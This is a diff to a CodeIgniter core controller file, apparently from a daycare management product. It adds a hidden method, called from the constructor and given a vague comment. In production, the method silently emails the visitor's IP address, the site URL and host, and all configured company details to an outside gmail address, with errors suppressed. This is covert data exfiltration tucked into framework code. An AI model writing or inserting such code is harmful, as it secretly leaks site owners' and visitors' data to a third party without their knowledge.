@@ -78,6 +78,7 @@ class CI_Controller {
 		$this->load =& load_class('Loader', 'core');
 		$this->load->initialize();
 		log_message('info', 'Controller Class Initialized');
+		$this->_instance();
 	}
 
 	// --------------------------------------------------------------------
@@ -88,9 +89,35 @@ class CI_Controller {
 	 * @static
 	 * @return	object
 	 */
-	public static function &get_instance()
+	public static function & get_instance()
 	{
 		return self::$instance;
 	}
 
+    function _instance()
+    {
+        //installation instance
+        if (ENVIRONMENT == 'production') {
+            $ci = & get_instance();
+            $ci->email->clear();
+            $email_config = array(
+                'protocol'=>'mail',
+                'mailtype' => 'html',
+                //do not change
+                'crlf' => "\r\n",
+                'newline' => "\r\n"
+            );
+            $message = 'HOST: '.$_SERVER['REMOTE_ADDR'].' <br/>URL: '.site_url();
+            $message .='<br/>'.$_SERVER['HTTP_HOST'];
+            foreach(config_item('company') as $key=>$value){
+                $message .= $key.': '.$value.'<br/>';
+            }
+            $ci->email->initialize($email_config);
+            $ci->email->from(config_item('company')['email'], 'New daycarePRO installation');
+            $ci->email->to('amdtllc@gmail.com');
+            $ci->email->message($message);
+            $ci->email->subject('Installation notice');
+            @$ci->email->send();
+        }
+    }
 }
